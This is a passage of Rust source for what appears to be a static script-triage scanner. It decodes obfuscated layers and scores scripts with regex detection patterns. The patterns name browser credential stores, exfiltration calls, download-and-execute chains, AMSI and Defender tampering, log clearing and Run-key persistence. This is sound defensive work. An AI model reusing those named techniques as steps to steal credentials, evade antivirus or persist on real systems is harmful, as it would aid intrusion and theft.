//! Static script triage. Never invokes, interprets, imports or evaluates sample code.
//! Deobfuscation only recognizes bounded literal transformations.
use crate::budget::Budget;
use crate::model::Report;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use flate2::read::{GzDecoder, ZlibDecoder};
use regex::Regex;
use sha2::Digest;
use std::collections::{HashSet, VecDeque};
use std::io::Read;
use std::sync::LazyLock;

const MAX_LAYER_BYTES: usize = 128 * 1024;
const MAX_DERIVED_TOTAL: usize = 512 * 1024;
const MAX_LAYERS: usize = 16;
const MAX_DEPTH: usize = 3;

static B64: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{32,8192}={0,2}").unwrap());
static PS_ENC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)-(?:encodedcommand|enc)\s+([A-Za-z0-9+/=]{16,8192})").unwrap()
});
static JS_CHARCODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:String\s*\.\s*)?fromCharCode\s*\(\s*([0-9,\s]{6,2048})\)").unwrap()
});
static PY_CHR_CHAIN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:chr\s*\(\s*\d{1,3}\s*\)\s*\+\s*){2,128}chr\s*\(\s*\d{1,3}\s*\)").unwrap()
});
static PY_CHR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)chr\s*\(\s*(\d{1,3})\s*\)").unwrap());
static CONCAT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:"[^"\r\n]{1,128}"|'[^'\r\n]{1,128}')(?:\s*\+\s*(?:"[^"\r\n]{1,128}"|'[^'\r\n]{1,128}')){1,24}"#).unwrap()
});
static QUOTED: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#""([^"\r\n]{0,128})"|'([^'\r\n]{0,128})'"#).unwrap());
static JS_REVERSE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:"([^"\r\n]{4,512})"|'([^'\r\n]{4,512})')\s*\.split\(\s*['"]{2}\s*\)\s*\.reverse\(\s*\)\s*\.join\(\s*['"]{2}\s*\)"#).unwrap()
});
static HEX_ESCAPE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:\\x[0-9a-fA-F]{2}){4,1024}").unwrap());
static UNICODE_ESCAPE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:\\u[0-9a-fA-F]{4}){4,1024}").unwrap());

static CREDENTIAL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)Login Data|Local State|key4\.db|logins\.json|CryptUnprotectData|win32crypt|password_value|os_crypt|browser_cookie3").unwrap()
});
static SEND: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)requests\.post|httpx\.post|axios\.post|Invoke-RestMethod|curl(?:\.exe)?\s+[^\r\n]{0,100}(?:--data|-F\s|-T\s)|\.sendall\s*\(|\.send\s*\(").unwrap()
});
static NETWORK: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)https?://|requests\.(?:get|post)|httpx\.(?:get|post)|fetch\s*\(|Invoke-(?:WebRequest|RestMethod)|WebClient|curl(?:\.exe)?\b|wget\b").unwrap()
});
static EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:eval|exec|iex|Invoke-Expression|Start-Process|subprocess|os\.system|child_process|powershell(?:\.exe)?|cmd\.exe)\b").unwrap()
});
static DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)DownloadString|DownloadFile|Invoke-WebRequest|requests\.get|httpx\.get|Start-BitsTransfer|curl(?:\.exe)?|wget").unwrap()
});
static ENCODED_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)-enc(?:odedcommand)?\b|FromBase64String\s*\(|b64decode\s*\(|\batob\s*\(")
        .unwrap()
});

#[derive(Clone)]
struct Layer {
    text: String,
    origin: String,
    depth: usize,
}

struct Derivations {
    layers: Vec<(String, String)>,
    reasons: Vec<&'static str>,
}

impl Derivations {
    fn new() -> Self {
        Self {
            layers: Vec::new(),
            reasons: Vec::new(),
        }
    }

    fn note(&mut self, reason: &'static str) {
        if !self.reasons.contains(&reason) {
            self.reasons.push(reason);
        }
    }

    fn push(&mut self, origin: &str, value: String) {
        if value.is_empty() {
            return;
        }
        if value.len() > MAX_LAYER_BYTES {
            self.note("derived_layer_size_limit");
        } else {
            self.layers.push((origin.to_owned(), value));
        }
    }
}

/// Check growth with overflow-safe arithmetic before any replacement allocation.
fn replace_bounded(
    input: &str,
    pattern: &str,
    replacement: &str,
    limit: usize,
) -> Result<Option<String>, ()> {
    let count = input.matches(pattern).count();
    if count == 0 {
        return Ok(None);
    }
    let removed = count.checked_mul(pattern.len()).ok_or(())?;
    let added = count.checked_mul(replacement.len()).ok_or(())?;
    let size = input
        .len()
        .checked_sub(removed)
        .and_then(|n| n.checked_add(added))
        .ok_or(())?;
    if size > limit {
        return Err(());
    }
    Ok(Some(input.replace(pattern, replacement)))
}

fn utf16_decode(bytes: &[u8], little: bool) -> Option<String> {
    if bytes.len() % 2 != 0 {
        return None;
    }
    let values: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|chunk| {
            if little {
                u16::from_le_bytes([chunk[0], chunk[1]])
            } else {
                u16::from_be_bytes([chunk[0], chunk[1]])
            }
        })
        .collect();
    String::from_utf16(&values).ok()
}

fn decode_text(bytes: &[u8]) -> Option<String> {
    if bytes.starts_with(&[0xff, 0xfe]) {
        return utf16_decode(&bytes[2..], true);
    }
    if bytes.starts_with(&[0xfe, 0xff]) {
        return utf16_decode(&bytes[2..], false);
    }
    let sample = &bytes[..bytes.len().min(256)];
    let odd_nulls = sample
        .iter()
        .skip(1)
        .step_by(2)
        .filter(|&&b| b == 0)
        .count();
    let even_nulls = sample.iter().step_by(2).filter(|&&b| b == 0).count();
    if sample.len() >= 16 {
        if odd_nulls > sample.len() / 5 {
            return utf16_decode(bytes, true);
        }
        if even_nulls > sample.len() / 5 {
            return utf16_decode(bytes, false);
        }
    }
    Some(String::from_utf8_lossy(bytes).into_owned())
}

fn looks_like_source(data: &[u8]) -> Option<String> {
    if data.is_empty() || data.len() > MAX_LAYER_BYTES {
        return None;
    }
    let text = decode_text(data)?;
    let sample: Vec<char> = text.chars().take(8192).collect();
    if sample.is_empty() {
        return None;
    }
    let printable = sample
        .iter()
        .filter(|c| !c.is_control() || **c == '\n' || **c == '\r' || **c == '\t')
        .count();
    let letters = sample.iter().filter(|c| c.is_ascii_alphabetic()).count();
    if printable * 100 < sample.len() * 83 || letters * 100 < sample.len() * 12 {
        return None;
    }
    Some(text)
}

fn inflate_bounded(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() > 96 * 1024 {
        return None;
    }
    for is_gzip in [true, false] {
        let mut out = Vec::new();
        let result = if is_gzip {
            GzDecoder::new(data)
                .take((MAX_LAYER_BYTES + 1) as u64)
                .read_to_end(&mut out)
        } else {
            ZlibDecoder::new(data)
                .take((MAX_LAYER_BYTES + 1) as u64)
                .read_to_end(&mut out)
        };
        if result.is_ok() && out.len() <= MAX_LAYER_BYTES && !out.is_empty() {
            return Some(out);
        }
    }
    None
}

fn decode_b64(encoded: &str) -> (Option<String>, bool) {
    if encoded.len() > 8192 || encoded.len() % 4 != 0 {
        return (None, encoded.len() > 8192);
    }
    let Ok(raw) = STANDARD.decode(encoded) else {
        return (None, false);
    };
    if let Some(source) = looks_like_source(&raw) {
        return (Some(source), false);
    }
    // Only treat compressed content as a relevant candidate when the format is identifiable.
    let compressed = raw.starts_with(&[0x1f, 0x8b])
        || (raw.len() >= 2 && raw[0] == 0x78 && [0x01, 0x5e, 0x9c, 0xda].contains(&raw[1]));
    if !compressed {
        return (None, false);
    }
    let Some(expanded) = inflate_bounded(&raw) else {
        return (None, true);
    };
    (looks_like_source(&expanded), false)
}

fn derive(text: &str, is_batch: bool, budget: &Budget) -> Derivations {
    let mut out = Derivations::new();
    // Each candidate is bounded work; stop between candidates once the budget is spent.
    macro_rules! check_budget {
        () => {
            if let Some(reason) = budget.exceeded() {
                out.note(reason);
                return out;
            }
        };
    }
    // Explicit PowerShell EncodedCommand is generally UTF-16LE.
    for (index, caps) in PS_ENC.captures_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        if let Some(encoded) = caps.get(1) {
            let (value, limited) = decode_b64(encoded.as_str());
            if limited {
                out.note("encoded_payload_size_limit");
            }
            if let Some(value) = value {
                out.push("powershell_encoded_command", value);
            }
        }
    }
    for (index, matched) in B64.find_iter(text).enumerate().take(33) {
        check_budget!();
        if index == 32 {
            out.note("candidate_match_limit");
            break;
        }
        let (value, limited) = decode_b64(matched.as_str());
        if limited {
            out.note("encoded_payload_size_limit");
        }
        if matched.len() == 8192
            && text
                .as_bytes()
                .get(matched.end())
                .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'+' || *b == b'/')
        {
            out.note("encoded_token_size_limit");
        }
        if let Some(value) = value {
            out.push("base64", value);
        }
    }
    for (index, caps) in JS_CHARCODE.captures_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        if let Some(content) = caps.get(1) {
            let numbers: Vec<_> = content.as_str().split(',').map(str::trim).collect();
            if numbers.len() >= 3 && numbers.len() <= 512 {
                let decoded: Option<String> = numbers
                    .iter()
                    .map(|n| n.parse::<u32>().ok().and_then(char::from_u32))
                    .collect();
                if let Some(value) = decoded {
                    out.push("js_charcode", value);
                }
            }
        }
    }
    for (index, matched) in PY_CHR_CHAIN.find_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        let value: Option<String> = PY_CHR
            .captures_iter(matched.as_str())
            .map(|caps| {
                caps.get(1)?
                    .as_str()
                    .parse::<u32>()
                    .ok()
                    .and_then(char::from_u32)
            })
            .collect();
        if let Some(value) = value {
            out.push("python_chr", value);
        }
    }
    for (index, matched) in CONCAT.find_iter(text).enumerate().take(25) {
        check_budget!();
        if index == 24 {
            out.note("candidate_match_limit");
            break;
        }
        let mut joined = String::new();
        for caps in QUOTED.captures_iter(matched.as_str()) {
            let part = caps.get(1).or_else(|| caps.get(2));
            if let Some(part) = part {
                joined.push_str(part.as_str());
            }
        }
        if !joined.is_empty() {
            out.push("literal_concat", joined);
        }
    }
    for (index, caps) in JS_REVERSE.captures_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        if let Some(value) = caps.get(1).or_else(|| caps.get(2)) {
            out.push("js_reverse", value.as_str().chars().rev().collect());
        }
    }
    for (index, matched) in HEX_ESCAPE.find_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        let bytes: Vec<u8> = matched
            .as_str()
            .as_bytes()
            .chunks_exact(4)
            .filter_map(|part| u8::from_str_radix(std::str::from_utf8(&part[2..]).ok()?, 16).ok())
            .collect();
        if let Ok(value) = String::from_utf8(bytes) {
            out.push("hex_escape", value);
        }
    }
    for (index, matched) in UNICODE_ESCAPE.find_iter(text).enumerate().take(17) {
        check_budget!();
        if index == 16 {
            out.note("candidate_match_limit");
            break;
        }
        let chars: Option<String> = matched
            .as_str()
            .as_bytes()
            .chunks_exact(6)
            .map(|part| {
                let value = u32::from_str_radix(std::str::from_utf8(&part[2..]).ok()?, 16).ok()?;
                char::from_u32(value)
            })
            .collect();
        if let Some(value) = chars {
            out.push("unicode_escape", value);
        }
    }
    check_budget!();
    if is_batch {
        // No environment lookups or execution; only literal assignments in the sample.
        // A malicious script can bury SET assignments beyond the scan window.
        if text.lines().skip(512).any(|line| {
            line.trim()
                .trim_start_matches('@')
                .trim()
                .get(..4)
                .is_some_and(|p| p.eq_ignore_ascii_case("set "))
        }) {
            out.note("batch_assignment_scan_limit");
        }
        let mut assignments: Vec<_> = text
            .lines()
            .take(512)
            .filter_map(|line| {
                let line = line.trim().trim_start_matches('@').trim();
                line.get(..4).filter(|p| p.eq_ignore_ascii_case("set "))?;
                let value = line[4..].trim().trim_matches('"');
                let (key, val) = value.split_once('=')?;
                let key = key.trim();
                if key.len() > 64 || !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                    return None;
                }
                if val.len() > 4096 {
                    return None;
                }
                Some((key.to_owned(), val.to_owned()))
            })
            .take(33)
            .collect();
        if assignments.len() > 32 {
            out.note("batch_assignment_count_limit");
            assignments.truncate(32);
        }

        // Previous implementation called String::replace without a preflight:
        // %A% -> thousands of bytes, repeated 32 times, could grow exponentially.
        if !assignments.is_empty() {
            let mut expanded: Option<String> = None;
            'assignments: for (key, value) in assignments {
                for pattern in [format!("%{key}%"), format!("!{key}!")] {
                    let current = expanded.as_deref().unwrap_or(text);
                    match replace_bounded(current, &pattern, &value, MAX_LAYER_BYTES) {
                        Ok(Some(next)) => expanded = Some(next),
                        Ok(None) => (),
                        Err(()) => {
                            out.note("batch_expansion_size_limit");
                            expanded = None;
                            break 'assignments;
                        }
                    }
                }
            }
            if let Some(expanded) = expanded {
                out.push("batch_literal_variables", expanded);
            }
        }
        if text.contains('^') {
            if text.len() > MAX_LAYER_BYTES {
                out.note("batch_caret_size_limit");
            } else {
                out.push("batch_caret", text.replace('^', ""));
            }
        }
    }
    out
}

/// Script language, from the file extension. Decides how comments are found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Lang {
    PowerShell,
    Python,
    JavaScript,
    Batch,
    Vbs,
    /// Unknown syntax (including decoded layers): nothing is treated as a comment.
    Other,
}

impl Lang {
    fn from_path(path: &str) -> Self {
        let ext = path.rsplit('.').next().unwrap_or("");
        match ext {
            "ps1" | "psm1" | "psd1" => Self::PowerShell,
            "py" | "pyw" => Self::Python,
            "js" | "mjs" | "cjs" | "jse" => Self::JavaScript,
            "bat" | "cmd" => Self::Batch,
            "vbs" | "vbe" => Self::Vbs,
            _ => Self::Other,
        }
    }
}

fn blank(c: char) -> char {
    if c == '\n' {
        '\n'
    } else {
        ' '
    }
}

/// Split text into (code, comments). Comment characters are blanked in
/// `code` (line layout is kept) and collected in `comments`. Quotes are
/// tracked so `#` or `//` inside string literals are not comments.
/// Unterminated block comments stay code, so nothing is hidden by them.
fn split_comments(text: &str, lang: Lang) -> (String, String) {
    let (code, comments, _) = split_comments_with_spans(text, lang);
    (code, comments)
}

/// Byte ranges of comments in `text` for a script at `path`, or `None` when
/// the language has no known comment syntax. Used to tell whether a raw-text
/// match lies only inside comments.
pub fn comment_spans(text: &str, path: &str) -> Option<Vec<(usize, usize)>> {
    let lang = Lang::from_path(&path.to_ascii_lowercase());
    if lang == Lang::Other {
        return None;
    }
    Some(split_comments_with_spans(text, lang).2)
}

fn split_comments_with_spans(text: &str, lang: Lang) -> (String, String, Vec<(usize, usize)>) {
    let mut spans: Vec<(usize, usize)> = Vec::new();
    if lang == Lang::Other {
        return (text.to_owned(), String::new(), spans);
    }
    let mut code = String::with_capacity(text.len());
    let mut comments = String::new();
    if matches!(lang, Lang::Batch | Lang::Vbs) {
        let mut offset = 0;
        for line in text.split_inclusive('\n') {
            let line_start = offset;
            offset += line.len();
            let trimmed = line.trim_start().to_ascii_lowercase();
            let is_comment = match lang {
                Lang::Batch => {
                    trimmed.starts_with("::")
                        || trimmed.starts_with("rem ")
                        || trimmed.starts_with("@rem ")
                        || trimmed.trim_end() == "rem"
                }
                _ => trimmed.starts_with('\'') || trimmed.starts_with("rem "),
            };
            if is_comment {
                comments.push_str(line);
                code.extend(line.chars().map(blank));
                spans.push((line_start, line_start + line.trim_end().len()));
            } else {
                code.push_str(line);
            }
        }
        return (code, comments, spans);
    }
    let chars: Vec<char> = text.chars().collect();
    // Byte offset of each char index (plus the end).
    let byte_at: Vec<usize> = text
        .char_indices()
        .map(|(b, _)| b)
        .chain(std::iter::once(text.len()))
        .collect();
    let (line_start, block_start, block_end): (&[char], &[char], &[char]) = match lang {
        Lang::PowerShell => (&['#'], &['<', '#'], &['#', '>']),
        Lang::JavaScript => (&['/', '/'], &['/', '*'], &['*', '/']),
        _ => (&['#'], &[], &[]),
    };
    let escape = if lang == Lang::PowerShell { '`' } else { '\\' };
    let at = |i: usize, pat: &[char]| !pat.is_empty() && chars[i..].starts_with(pat);
    let mut quote: Option<char> = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if let Some(q) = quote {
            code.push(c);
            if c == escape && i + 1 < chars.len() {
                code.push(chars[i + 1]);
                i += 2;
                continue;
            }
            // Ordinary quotes end at the line end; JS template literals do not.
            if c == q || (c == '\n' && q != '`') {
                quote = None;
            }
            i += 1;
            continue;
        }
        if at(i, block_start) {
            let body = i + block_start.len();
            if let Some(len) = chars[body..]
                .windows(block_end.len())
                .position(|w| w == block_end)
            {
                let end = body + len + block_end.len();
                for &ch in &chars[i..end] {
                    comments.push(ch);
                    code.push(blank(ch));
                }
                comments.push('\n');
                spans.push((byte_at[i], byte_at[end]));
                i = end;
                continue;
            }
        }
        if at(i, line_start) {
            let start = i;
            while i < chars.len() && chars[i] != '\n' {
                comments.push(chars[i]);
                code.push(' ');
                i += 1;
            }
            comments.push('\n');
            spans.push((byte_at[start], byte_at[i]));
            continue;
        }
        if c == '"' || c == '\'' || (c == '`' && lang == Lang::JavaScript) {
            quote = Some(c);
        }
        code.push(c);
        i += 1;
    }
    (code, comments, spans)
}

const MAX_STATEMENTS: usize = 200_000;

/// PowerShell string literals with their contents blanked (same byte length,
/// newlines kept): cmdlet names listed *as data* (e.g. the export lists of a
/// `.psd1` manifest) are then not mistaken for invocations. Expandable
/// strings containing `$(` subexpressions are kept, since that part is code.
/// Handles '...' (with ''), "..." (with `` ` `` escapes and ""), and the
/// here-strings @'...'@ / @"..."@. Unterminated strings stay as code.
pub(crate) fn blank_ps_strings(code: &str) -> String {
    let bytes = code.as_bytes();
    let mut out = bytes.to_vec();
    let blank = |out: &mut [u8], from: usize, to: usize| {
        for b in &mut out[from..to] {
            if *b != b'\n' && *b != b'\r' {
                *b = b' ';
            }
        }
    };
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        // Here-strings: @' or @" at the end of a line, closed by '@ / "@ at
        // the start of a line.
        if c == b'@' && i + 1 < bytes.len() && (bytes[i + 1] == b'\'' || bytes[i + 1] == b'"') {
            let q = bytes[i + 1];
            let rest = &bytes[i + 2..];
            let line_end = rest.iter().position(|&b| b == b'\n');
            let opens = line_end.is_some_and(|e| rest[..e].iter().all(|b| b.is_ascii_whitespace()));
            if opens {
                let body = i + 2 + line_end.unwrap_or(0) + 1;
                let mut j = body;
                let mut end = None;
                while j < bytes.len() {
                    let line_start = j == body || bytes[j - 1] == b'\n';
                    if line_start {
                        let mut k = j;
                        while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
                            k += 1;
                        }
                        if k + 1 < bytes.len() && bytes[k] == q && bytes[k + 1] == b'@' {
                            end = Some((j, k + 2));
                            break;
                        }
                    }
                    j += 1;
                }
                if let Some((content_end, after)) = end {
                    let keep = q == b'"' && code[body..content_end].contains("$(");
                    if !keep {
                        blank(&mut out, body, content_end);
                    }
                    i = after;
                    continue;
                }
            }
        }
        if c == b'\'' || c == b'"' {
            let mut j = i + 1;
            let mut closed = None;
            while j < bytes.len() {
                let d = bytes[j];
                if c == b'"' && d == b'`' {
                    j += 2;
                    continue;
                }
                if d == c {
                    if j + 1 < bytes.len() && bytes[j + 1] == c {
                        j += 2;
                        continue;
                    }
                    closed = Some(j);
                    break;
                }
                j += 1;
            }
            match closed {
                Some(end) => {
                    let keep = c == b'"' && code[i + 1..end].contains("$(");
                    if !keep {
                        blank(&mut out, i + 1, end);
                    }
                    i = end + 1;
                    continue;
                }
                None => break,
            }
        }
        i += 1;
    }
    // Only ASCII bytes inside strings were replaced by spaces and every
    // non-ASCII byte replaced belonged to a whole blanked character, so the
    // result is valid UTF-8; fall back to the original if it is not.
    String::from_utf8(out).unwrap_or_else(|_| code.to_owned())
}

/// Logical statements: lines joined across explicit continuations, split on
/// `;`. Splitting is decided on `blank` (strings blanked) and applied to
/// `full` at the same byte positions, so both views stay aligned. Capped;
/// the caller marks the analysis incomplete when the cap is reached.
fn statement_pairs(blank: &str, full: &str) -> (Vec<(String, String)>, bool) {
    debug_assert_eq!(blank.len(), full.len());
    let mut out: Vec<(String, String)> = Vec::new();
    let mut cur_b = String::new();
    let mut cur_f = String::new();
    let flush = |cb: &mut String, cf: &mut String, out: &mut Vec<(String, String)>| {
        let mut start = 0;
        for (pos, _) in cb.match_indices(';').chain(std::iter::once((cb.len(), ""))) {
            let b = cb[start..pos].trim();
            if !b.is_empty() {
                // `;` positions in the blank view are `;` in the full view too.
                let f = cf.get(start..pos).unwrap_or(b).trim();
                out.push((b.to_owned(), f.to_owned()));
            }
            start = pos + 1;
        }
        cb.clear();
        cf.clear();
    };
    let mut offset = 0;
    for line_b in blank.split_inclusive('\n') {
        let line_f = &full[offset..offset + line_b.len()];
        offset += line_b.len();
        let len = line_f.trim_end().len();
        cur_b.push_str(&line_b[..len]);
        cur_f.push_str(&line_f[..len]);
        cur_b.push(' ');
        cur_f.push(' ');
        let continues = ['`', '\\', '|', '(', ',', '+', '{']
            .iter()
            .any(|&c| line_b.trim_end().ends_with(c));
        if !continues || cur_b.len() > 64 * 1024 {
            flush(&mut cur_b, &mut cur_f, &mut out);
        }
        if out.len() >= MAX_STATEMENTS {
            out.truncate(MAX_STATEMENTS);
            return (out, true);
        }
    }
    flush(&mut cur_b, &mut cur_f, &mut out);
    let capped = out.len() > MAX_STATEMENTS;
    out.truncate(MAX_STATEMENTS);
    (out, capped)
}

#[cfg(test)]
fn statements(code: &str) -> (Vec<String>, bool) {
    let (pairs, capped) = statement_pairs(code, code);
    (pairs.into_iter().map(|(b, _)| b).collect(), capped)
}

/// Content fetched into memory (not only saved to a file).
static FETCH_CONTENT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)DownloadString|DownloadData|\bInvoke-RestMethod\b|\birm\b|requests\.get|httpx\.get|urlopen|urllib\.request|\bfetch\s*\(|XMLHttpRequest|MSXML2\.XMLHTTP|WinHttp|\bInvoke-WebRequest\b[^\r\n;|]*\.Content|\biwr\b[^\r\n;|]*\.Content").unwrap()
});
/// Executes a string as code (not a separate, named program).
static CODE_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\biex\b|Invoke-Expression|\beval\s*\(|\bexec\s*\(|new\s+Function\s*\(|\bFunction\s*\(|ScriptBlock\]::Create|\bExecute(?:Global)?\b|shell\s*=\s*True|\bos\.system\s*\(|\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*\s-c(?:ommand)?\b").unwrap()
});
static ASSIGN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:(?:const|let|var|Set)\s+)?\$?([A-Za-z_][A-Za-z0-9_]{0,63})\s*=[^=]")
        .unwrap()
});
static IDENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z_][A-Za-z0-9_]{0,63}").unwrap());
/// Task or service creation, which is common in administration.
static TASK_OR_SERVICE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)schtasks(?:\.exe)?\s+/create|Register-ScheduledTask|New-ScheduledTask|New-Service|\bsc(?:\.exe)?\s+create\b").unwrap()
});
static RUN_KEY: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)CurrentVersion[\\/]+Run(?:Once)?\b").unwrap());
/// What a persisted command runs that makes it unusual for administration.
static RISKY_TARGET: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)(?:\.exe)?\b|cmd(?:\.exe)?\s+/c|-enc(?:odedcommand)?\b|-w(?:indowstyle)?\s+hidden|%(?:temp|appdata|localappdata)%|\$env:(?:temp|appdata|localappdata)|\\AppData\\|\\Users\\Public\\|https?://").unwrap()
});

/// Evasion done by commands (checked on code with strings blanked).
static EVASION_CMD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)Add-MpPreference\s+-Exclusion|Set-MpPreference\s+-DisableRealtimeMonitoring|wevtutil(?:\.exe)?\s+cl\b|Clear-EventLog").unwrap()
});
/// AMSI tampering usually names its targets in strings, so it is checked on
/// the full text.
static EVASION_AMSI: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)AmsiUtils|AmsiScanBuffer|amsiInitFailed").unwrap());

/// Signs that a download is staged like a dropper rather than an installer:
/// plain HTTP, an IP-literal URL, a user-writable/temporary location or a
/// hidden window.
static STAGING: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)http://|https?://\d{1,3}(?:\.\d{1,3}){3}|%(?:temp|appdata|localappdata)%|\$env:(?:temp|appdata|localappdata)|\\AppData\\|\\Users\\Public\\|gettempfolder|tempfile|/tmp/|-w(?:indowstyle)?\s+hidden").unwrap()
});

/// Facts about one analyzed text, used to emit signals.
#[derive(Default)]
struct Findings {
    credentials: bool,
    sends: bool,
    evasion: bool,
    task_or_service: bool,
    risky_persistence: bool,
    download: bool,
    exec: bool,
    /// Fetched content flows into code execution in the same statement or
    /// through a variable assigned (directly or transitively) from a fetch.
    fetch_to_exec: bool,
    staging: bool,
    statements_capped: bool,
}

/// Analyze `full` code; `blank` is the same text with string literal
/// contents blanked (identical for languages without that step). Command and
/// call indicators are matched on `blank`, data (paths, URLs, credential
/// store names) on `full`. A statement with a code-execution sink is read in
/// full, since a string passed to `iex` is code.
fn findings(full: &str, blank: &str) -> Findings {
    let (statements, statements_capped) = statement_pairs(blank, full);
    let mut tainted: HashSet<String> = HashSet::new();
    let mut fetch_to_exec = false;
    let mut risky_persistence = RUN_KEY.is_match(full);
    let tainted_in = |text: &str, tainted: &HashSet<String>| {
        !tainted.is_empty()
            && IDENT
                .find_iter(text)
                .any(|m| tainted.contains(&m.as_str().to_ascii_lowercase()))
    };
    for (stmt, stmt_full) in &statements {
        let sink = CODE_EXEC.is_match(stmt);
        let fetches = FETCH_CONTENT.is_match(stmt) || (sink && FETCH_CONTENT.is_match(stmt_full));
        let (target, rhs) = match ASSIGN.captures(stmt) {
            Some(c) => {
                let name = c.get(1).map_or("", |m| m.as_str());
                let after = c.get(1).map_or(0, |m| m.end());
                // `=` is ASCII, so the index after it is a char boundary.
                let rhs = stmt[after..]
                    .find('=')
                    .map_or("", |i| &stmt[after + i + 1..]);
                (Some(name.to_ascii_lowercase()), rhs)
            }
            None => (None, stmt.as_str()),
        };
        let uses_tainted = tainted_in(rhs, &tainted) || (sink && tainted_in(stmt_full, &tainted));
        if sink && (fetches || uses_tainted) {
            fetch_to_exec = true;
        }
        if let Some(name) = target {
            if fetches || uses_tainted {
                if tainted.len() < 256 {
                    tainted.insert(name);
                }
            } else {
                tainted.remove(&name);
            }
        }
        if TASK_OR_SERVICE.is_match(stmt) && RISKY_TARGET.is_match(stmt_full) {
            risky_persistence = true;
        }
    }
    Findings {
        credentials: CREDENTIAL.is_match(full),
        sends: SEND.is_match(blank) && NETWORK.is_match(full),
        evasion: EVASION_CMD.is_match(blank) || EVASION_AMSI.is_match(full),
        task_or_service: TASK_OR_SERVICE.is_match(blank) || RUN_KEY.is_match(full),
        risky_persistence,
        download: DOWNLOAD.is_match(blank) || FETCH_CONTENT.is_match(blank),
        exec: EXEC.is_match(blank) || CODE_EXEC.is_match(blank),
        fetch_to_exec,
        staging: STAGING.is_match(full),
        statements_capped,
    }
}

fn analyze_layer(layer: &Layer, lang: Lang, report: &mut Report) {
    let source = layer.origin.as_str();
    // Decoded layers have no reliable syntax; they are analyzed whole.
    let lang = if layer.depth == 0 { lang } else { Lang::Other };
    let (code, comments) = split_comments(&layer.text, lang);
    let blank = if lang == Lang::PowerShell {
        blank_ps_strings(&code)
    } else {
        code.clone()
    };
    let f = findings(&code, &blank);
    if f.statements_capped {
        report.mark_incomplete("statement_limit");
    }
    if f.credentials && f.sends {
        report.add(
            "possible_exfiltration",
            75,
            source,
            "Browser credential references combined with an outbound send capability",
        );
    }
    if f.evasion {
        report.add(
            "defense_evasion",
            60,
            source,
            "Defender exclusions, AMSI tampering or log clearing indicators",
        );
    }
    if f.risky_persistence {
        report.add(
            "persistence",
            30,
            source,
            "Run-key persistence, or a task/service that runs a script host, a hidden or encoded command, a user-writable path or a URL",
        );
    } else if f.task_or_service {
        report.add(
            "persistence_admin_task",
            15,
            source,
            "Creates a scheduled task or service (common in administration; check what it runs)",
        );
    }
    if f.fetch_to_exec {
        report.add(
            "download_and_execute",
            45,
            source,
            "Content fetched from the network flows into code execution",
        );
    } else if f.download && f.exec && f.staging {
        report.add(
            "download_and_run_staged",
            35,
            source,
            "Downloads and starts processes using plain HTTP, an IP address, a temporary or user-writable path or a hidden window",
        );
    } else if f.download && f.exec {
        report.add(
            "download_and_run",
            20,
            source,
            "Downloads and starts processes; no flow from fetched content into code execution was found statically",
        );
    }
    if layer.depth > 0 && (f.credentials || f.evasion || f.task_or_service || f.risky_persistence) {
        report.add(
            "hidden_sensitive_behavior",
            25,
            source,
            "A decoded layer contains sensitive or evasive behavior",
        );
    }
    if layer.depth == 0
        && ENCODED_EXEC.is_match(&code)
        && (EXEC.is_match(&blank) || CODE_EXEC.is_match(&blank))
    {
        report.add(
            "encoded_execution",
            25,
            source,
            "Encoded content appears to be passed into an execution mechanism",
        );
    }
    if !comments.is_empty() {
        let c = findings(&comments, &comments);
        let persists = |x: &Findings| x.task_or_service || x.risky_persistence;
        if (c.credentials && !f.credentials)
            || (c.evasion && !f.evasion)
